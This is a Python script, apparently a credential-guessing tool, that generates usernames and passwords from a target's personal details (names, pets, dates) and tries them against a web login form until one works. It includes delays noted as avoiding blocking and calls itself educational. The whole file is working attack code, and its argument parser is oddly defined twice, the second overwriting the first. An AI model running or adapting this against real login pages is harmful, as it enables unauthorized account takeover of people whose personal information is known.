#!/usr/bin/env python3

import argparse
import itertools
import requests
import sys
from wordgen import generate_passwords, generate_usernames

from time import sleep

# Banner em ASCII
def show_banner():
    banner = r"""
__        __   _     _      ____  _____ ____  
\ \      / /__| |__ (_) ___|  _ \| ____|  _ \ 
 \ \ /\ / / _ \ '_ \| |/ __| | | |  _| | |_) |
  \ V  V /  __/ |_) | | (__| |_| | |___|  _ < 
   \_/\_/ \___|_.__/|_|\___|____/|_____|_| \_\
    """
    print(banner)

# Envia a requisição para o site e verifica a resposta
def try_login(url, username, password, request_type):
    if request_type == "http-form-post":
        data = {'username': username, 'password': password}
        try:
            response = requests.post(url, data=data, timeout=5)
            # Simples verificação genérica de sucesso (ajuste conforme necessário)
            if "login failed" not in response.text.lower():
                return True
        except requests.RequestException as e:
            print(f"[!] Erro na requisição: {e}")
    return False

def main():
    parser = argparse.ArgumentParser(
        prog='whatpwd',
        description="Ferramenta de adivinhação de senhas e usernames baseada em gostos pessoais (para uso educacional).",
        epilog="Exemplo: whatpwd -u {user} -p {password} -s rex;antonio;01022003;bryan -r http-form-post -url https://siteficticio.com/login.php",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument(
        "-u", "--username",
        help="Nome de usuário ou e-mail.\nUse {user} para tentar adivinhar com base nas strings fornecidas.",
        default="{user}"
    )
    parser.add_argument(
        "-p", "--password",
        help="Senha a ser testada.\nUse {password} para gerar combinações com base nos gostos pessoais.",
        default="{password}"
    )
    parser.add_argument(
        "-s", "--strings",
        help="Lista de gostos pessoais, datas, apelidos etc., separadas por ponto e vírgula.\nEx: -s rex;antonio;01022003;bryan",
        required=True
    )
    parser.add_argument(
        "-r", "--request",
        help="Tipo de requisição.\nAtualmente suportado: http-form-post",
        default="http-form-post"
    )
    parser.add_argument(
        "-url", "--url",
        help="URL do formulário de login que será testado.",
        required=True
    )
    parser = argparse.ArgumentParser(description="Ferramenta para simular ataque por engenharia social")
    parser.add_argument("-u", "--username", help="Email ou nome de usuário", default="{user}")
    parser.add_argument("-p", "--password", help="Senha, ou {password} para tentar adivinhar", default="{password}")
    parser.add_argument("-s", "--strings", help="Strings de referência (gostos, datas, nomes), separadas por ponto e vírgula", required=True)
    parser.add_argument("-r", "--request", help="Tipo de requisição (ex: http-form-post)", default="http-form-post")
    parser.add_argument("-url", "--url", help="URL para envio da requisição", required=True)
    args = parser.parse_args()

    show_banner()
    if args.username == "{user}":
        print("[*] Modo de descoberta de username ativado.")
        strings = args.strings.split(";")
        usernames = generate_usernames(strings)
        passwords = generate_passwords(strings)

        for user in usernames:
            print(f"[*] Testando username: {user}")
            for pwd in passwords:
                print(f"    Tentando senha: {pwd}")
                if try_login(args.url, user, pwd, args.request):
                    print(f"[+] Sucesso: usuário='{user}' senha='{pwd}'")
                    return
                sleep(0.3)
        print("[-] Nenhuma combinação de username e senha funcionou.")
        return

    if args.password == "{password}":
        print(f"[*] Gerando combinações com base nas strings: {args.strings}")
        strings = args.strings.split(";")
        generated_passwords = generate_passwords(strings)

        print("[*] Iniciando tentativa de login...")
        for pwd in generated_passwords:
            print(f"[*] Tentando senha: {pwd}")
            if try_login(args.url, args.username, pwd, args.request):
                print(f"[+] Senha encontrada: {pwd}")
                return
            sleep(0.5)  # Evita bloqueio por muitas requisições
        print("[-] Nenhuma senha foi bem-sucedida.")
    else:
        if try_login(args.url, args.username, args.password, args.request):
            print(f"[+] Senha correta: {args.password}")
        else:
            print("[-] Senha incorreta.")

if __name__ == "__main__":
    main()
